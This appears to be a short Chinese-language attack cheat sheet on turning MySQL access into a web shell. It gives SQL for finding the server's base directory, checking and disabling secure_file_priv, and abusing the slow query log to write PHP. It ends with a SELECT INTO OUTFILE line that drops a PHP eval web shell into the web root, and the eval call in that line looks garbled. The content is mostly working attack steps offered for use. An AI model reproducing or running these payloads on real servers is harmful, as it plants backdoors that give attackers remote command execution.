## 利用文件包含get shell

### 获取web绝对路径
select @@basedir;

### secure_file_priv
```sql
SHOW VARIABLES LIKE '%secure_file_priv%'; --结果为null时无法写入文件
```
修改my.ini:secure_file_priv =

## 利用日志getshell
```sql
set global slow_query_log=1; --开启慢查询日志
set global slow_query_log_file='dir\filename';
select '<?php phpinfo();?>' or sleep(11);
```
### 一般多少秒成为慢查询

```sql
show global variables like '%long_query_time%'
-- 默认10秒
```
## 文件写入

```sql
select '<?php @eval_r($_POST[cmd])?>'INTO OUTFILE '网站目录路径/eval.php'
```